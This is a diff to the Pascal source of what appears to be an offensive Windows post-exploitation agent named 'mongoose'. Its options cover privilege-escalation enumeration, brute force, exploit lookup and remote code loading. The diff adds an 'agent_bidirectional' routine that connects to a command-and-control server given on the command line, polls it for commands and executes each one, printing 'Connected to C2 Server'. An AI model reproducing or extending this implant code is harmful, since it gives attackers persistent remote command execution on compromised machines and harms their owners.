@@ -119,7 +119,7 @@ type
     procedure Acc_BF;virtual;
     procedure ex_code;virtual;
     procedure remote_lib;virtual;
-   // function SSL_exfiltration(URL: string): string;
+    procedure agent_bidirectional;virtual;
   end;
 
 
@@ -140,7 +140,7 @@ var
   ErrorMsg: String;
 begin
   // quick check parameters
-  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain import remote ssl', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce');
+  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain import remote ssl eval', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce');
   if ErrorMsg<>'' then begin
     ShowException(Exception.Create(ErrorMsg));
     Terminate;
@@ -178,8 +178,11 @@ begin
   if hasoption('cmd') then begin
     http_cmdlet;
     terminate;
-
   end;
+  if hasoption('eval') then begin
+   agent_bidirectional;
+   terminate;
+    end;
   if hasoption('d','downloadfile') then begin
     download;
     end;
@@ -213,6 +216,7 @@ begin
   if hasoption('import') then begin
   //
   ex_code;
+
   end;
   if hasoption('remote') then begin
   remote_lib;
@@ -361,6 +365,80 @@ begin
   end;
   Readln;
  end;
+
+
+
+
+procedure Tmongoose.agent_bidirectional;
+ var
+  prv_command,host,nxt_command,auth:string;
+  outdata:string;
+  i:integer;
+  isokay,ssl_enabled:boolean;
+  payload,payload2:ansistring;
+  msg:string;
+ begin
+   msg := '[->] Agent is Connected ';
+
+   isokay := false;
+   ssl_enabled := false;
+
+    for i := 1 to paramcount do begin
+
+      if(paramstr(i)='-srvhost') then begin
+        host := paramstr(i+1);
+        isokay := true;
+      end;
+      if (paramstr(i)='-x') then begin
+        auth := paramstr(i+1);
+      end;
+      if (paramstr(i) = '-ssl') then begin
+        ssl_enabled := true;
+      end;
+
+
+    end;
+   writeln('[^]Connecting to server...');
+   payload :='username=admin&password='+auth+'&command_output='+msg;
+   if (ssl_enabled) then
+
+   request(host,payload,'/api/cmd_commands',true)
+  else
+   request(host,payload,'/api/cmd_commands',false);
+
+   if (ssl_enabled) then
+   prv_command := GetWebPage('https://'+host+DEF_PORT+'/api/getcommands') //fetch first command from node js
+    else
+    prv_command := GetWebPage('http://'+host+DEF_PORT+'/api/getcommands'); //fetch first command from node js
+
+   if prv_command > '0' then begin
+   writeln('[>]Connected to C2 Server..Ready');
+   outdata := agent_exec(prv_command);   //run and exeucte the code
+   writeln(outdata); //write output into terminal
+
+
+  while isokay do begin // loop for newer commands
+     if (ssl_enabled) then
+   nxt_command := GetWebPage('https://'+host+DEF_PORT+'/api/getcommands') //check again for commands api changes
+     else
+     nxt_command := GetWebPage('http://'+host+DEF_PORT+'/api/getcommands'); //check again for commands api changes
+
+   if prv_command <> nxt_command then begin  // if first command different from newer one then run newer command
+
+   agent_exec(nxt_command); //execute the newer command
+
+
+  prv_command:=nxt_command;  // make previous command equal to newer command , conditional state
+   writeln('[!] waiting another command , CTRL+C to Exit');
+   sleep(2000);    //sleep before execution to avoid termination
+
+   end;
+
+ end;
+ end;
+
+ end;
+
  procedure Tmongoose.http_cmdlet;
  var
   prv_command,host,nxt_command,auth:string;
@@ -1376,7 +1454,7 @@ begin
   writeln('-w',' --enumerate for writeable directories, access permission Check, modified permissions. ');
   writeln('-i',' --enumerate windows system information, Sessions, Always elvated check.');
   writeln('-l',' --search in any file for specific string , ex : agent.exe -l c:\ password *.config. ');
-  writeln('-o',' --specify host address of nodejs application. ');
+  writeln('-o',' --specify host address of nodejs application , you can use srvhost also ');
   writeln('-p',' --enumerate installed Softwares, Running Processes, Tasks. ');
   Writeln('-e',' --kernel inspection Tool, it will help to search through tool databases for windows kernel vulnerabilities');
   writeln('-x',' --password to authorize your connection with node js application. ');
